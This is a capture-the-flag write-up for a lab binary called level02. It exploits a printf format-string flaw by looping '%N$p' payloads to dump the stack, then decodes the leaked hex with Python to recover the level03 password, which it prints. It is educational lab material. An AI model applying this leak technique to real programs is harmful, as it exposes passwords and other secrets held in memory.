Here we see that one more time the executable prompts for a username and a password.
This time looking at the decompiled code we see that it would be possible to attack this binary using a format string exploit, because it's calling printf with a variable format as parameter.

# Locating the password
The other thing we see is that the binary is reading the password we want (/home/users/level03/.pass) at the beginning of the file, that means that at the moment we use printf, the password is somewhere on the stack.
Knowing it, we decide to use printf to print the stack, at least the 64 first values under the shape of hex pointers, so we can first measure the size of the printable stack.

```sh
for ((i = 1; i < 64; i++)); do
	echo "AAAA $i - %$i\$p" |./level02 | grep "does not have access" ; done
```
The echos are where things are happening, here we tell the printf inside level02 to print the ith value on the stack as a hexadecimal pointer and repeat it for i from 1 to 63

```
AAAA1 - 0x7fffffffea10 does not have access!
AAAA2 - (nil) does not have access!
AAAA3 - (nil) does not have access!
AAAA4 - 0x2a2a2a2a2a2a2a2a does not have access!
AAAA5 - 0x2a2a2a2a2a2a2a2a does not have access!
AAAA6 - 0x7fffffffec08 does not have access!
AAAA7 - 0x1f7ff9a08 does not have access!
AAAA8 - (nil) does not have access!
AAAA9 - (nil) does not have access!
AAAA10 - (nil) does not have access!
AAAA11 - (nil) does not have access!
AAAA12 - (nil) does not have access!
AAAA13 - (nil) does not have access!
AAAA14 - (nil) does not have access!
AAAA15 - (nil) does not have access!
AAAA16 - (nil) does not have access!
AAAA17 - (nil) does not have access!
AAAA18 - (nil) does not have access!
AAAA19 - (nil) does not have access!
AAAA20 - 0x100000000 does not have access!
AAAA21 - (nil) does not have access!
AAAA22 - 0x756e505234376848 does not have access!
AAAA23 - 0x45414a3561733951 does not have access!
AAAA24 - 0x377a7143574e6758 does not have access!
AAAA25 - 0x354a35686e475873 does not have access!
AAAA26 - 0x48336750664b394d does not have access!
AAAA27 - (nil) does not have access!
AAAA28 - 0x2d20383241414141 does not have access!
AAAA29 - 0x702439322520 does not have access!
AAAA30 - (nil) does not have access!
AAAA31 - (nil) does not have access!
AAAA32 - (nil) does not have access!
AAAA33 - (nil) does not have access!
AAAA34 - (nil) does not have access!
AAAA35 - (nil) does not have access!
AAAA36 - (nil) does not have access!
AAAA37 - (nil) does not have access!
AAAA38 - (nil) does not have access!
AAAA39 - (nil) does not have access!
AAAA40 - 0x2900000000 does not have access!
AAAA41 - 0x602010 does not have access!
AAAA42 - (nil) does not have access!
AAAA43 - 0x7ffff7a3d7ed does not have access!
AAAA44 - (nil) does not have access!
AAAA45 - 0x7fffffffec08 does not have access!
AAAA46 - 0x100000000 does not have access!
AAAA47 - 0x400814 does not have access!
AAAA48 - (nil) does not have access!
AAAA49 - 0x1b3535d016b2991e does not have access!
AAAA50 - 0x400730 does not have access!
AAAA51 - 0x7fffffffec00 does not have access!
AAAA52 - (nil) does not have access!
AAAA53 - (nil) does not have access!
AAAA54 - 0x6f9d83a9a2baacb5 does not have access!
AAAA55 - 0xe414ab7a767334b3 does not have access!
AAAA56 - 0x7fff00000000 does not have access!
AAAA57 - (nil) does not have access!
AAAA58 - (nil) does not have access!
AAAA59 - 0x400ac0 does not have access!
AAAA60 - 0x7fffffffec08 does not have access!
AAAA61 - 0x1 does not have access!
AAAA62 - (nil) does not have access!
AAAA63 - (nil) does not have access!
```

We can see line 28 that we printed 41414141 that is the hex code for AAAA that we asked printf to print first.
that means that after the 28th line all that is printed is after the printf string on the stack, and that we have to look above this line.

the new script will look like :

```sh
for ((i = 1; i < 28; i++)); do
	echo "$i - %$i\$p" |./level02 | grep "does not have access"; done
```


Here is the result of this script.
```
1 - 0x7fffffffea10 does not have access!
2 - (nil) does not have access!
3 - (nil) does not have access!
4 - 0x2a2a2a2a2a2a2a2a does not have access!
5 - 0x2a2a2a2a2a2a2a2a does not have access!
6 - 0x7fffffffec08 does not have access!
7 - 0x1f7ff9a08 does not have access!
8 - (nil) does not have access!
9 - (nil) does not have access!
10 - (nil) does not have access!
11 - (nil) does not have access!
12 - (nil) does not have access!
13 - (nil) does not have access!
14 - (nil) does not have access!
15 - (nil) does not have access!
16 - (nil) does not have access!
17 - (nil) does not have access!
18 - (nil) does not have access!
19 - (nil) does not have access!
20 - 0x100000000 does not have access!
21 - (nil) does not have access!
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
27 - (nil) does not have access!
```

# Decoding the password
The most random block we see is from line 22 to 26.
so we try to decode and reverse those to big endian using python :

```python
tab = ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']
for i in tab:
    print(i.decode('hex')[::-1])
```

That gives us :
```
Hh74RPnu
Q9sa5JAE
XgNWCqz7
sXGnh5J5
M9KfPg3H
```

Displayed as a string it's like 'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'.
And turns out this works as the password to log as level03, I think we have the flag we wanted.
